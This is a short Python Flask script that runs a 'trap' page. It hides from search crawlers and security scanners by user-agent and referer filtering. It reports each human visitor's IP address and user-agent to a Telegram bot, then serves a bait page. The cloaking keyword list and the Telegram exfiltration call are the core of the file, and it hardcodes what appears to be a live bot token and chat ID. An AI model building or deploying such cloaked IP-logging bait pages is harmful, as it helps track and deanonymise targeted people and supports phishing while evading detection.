from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# 🔐 Replace these with your actual bot token and chat ID
BOT_TOKEN = "7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc"
CHAT_ID = "6908281054"

# ❌ Blocked bots list
bot_keywords = [
    "google", "bot", "crawl", "spider", "slurp", "bing", "facebook", "headless",
    "python", "curl", "wget", "axios", "postman", "go-http-client", "scan", "nmap", "node"
]

def is_bot(user_agent):
    return any(keyword in user_agent.lower() for keyword in bot_keywords)

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except:
        pass

@app.route("/")
def trap():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    referer = request.headers.get("Referer", "")

    # ❌ Silent ignore for bots
    if is_bot(ua) or any(ref in referer.lower() for ref in ['google.', 'bing.', 'yahoo.', 'duckduckgo.']):
        return "", 204

    # ✅ Human trap triggered
    msg = f"🎯 *Trap Hit!*\n🌐 IP: {ip}\n📱 UA: {ua}"
    send_to_telegram(msg)
    return render_template("bait.html")

if __name__ == "__main__":
    app.run()
